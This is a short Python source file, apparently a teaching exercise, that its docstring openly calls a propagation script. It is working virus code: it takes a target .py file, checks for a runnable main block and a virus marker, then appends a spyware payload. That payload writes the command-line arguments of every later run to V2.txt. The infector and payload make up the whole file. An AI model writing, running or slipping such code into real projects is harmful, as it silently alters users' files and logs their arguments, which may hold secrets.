"""
V2.py
Propagation script:
- Takes a target .py filename as a command line argument.
- Determines if it is a runnable Python script (contains if __name__ == "__main__").
- Checks if it is uninfected (using a virus marker).
- If uninfected, injects spyware payload that logs command-line arguments
  to V2.txt whenever the infected file runs.
"""

import sys
VIRUS_MARKER = "# --- BEGIN VIRUS ---"
PAYLOAD = '''
# --- BEGIN VIRUS ---
import sys

def spyware_log():
    with open("V2.txt", "a") as f:
        f.write(" ".join(sys.argv) + "\\n")

spyware_log()
# --- END VIRUS ---
'''

def is_script(filename):
    """Returns True if the file contains the main entry point."""
    with open(filename, "r") as f:
        content = f.read()
    return 'if __name__ == "__main__"' in content

def is_infected(filename):
    """Check if payload already exists using the virus marker."""
    with open(filename, "r") as f:
        return VIRUS_MARKER in f.read()

def infect(filename):
    """Inject the payload at the end of the script."""
    with open(filename, "a") as f:
        f.write(PAYLOAD)

def main():
    if len(sys.argv) != 2:
        print("Usage: python V2.py target.py")
        return

    target = sys.argv[1]

    if not target.endswith(".py"):
        print("Not a Python file.")
        return

    try:
        if not is_script(target):
            print(f"{target} is not a runnable script.")
            return

        if is_infected(target):
            print(f"{target} is already infected.")
            return

        infect(target)
        print(f"Successfully infected {target}.")

    except FileNotFoundError:
        print("The target file does not exist.")

if __name__ == "__main__":
    main()
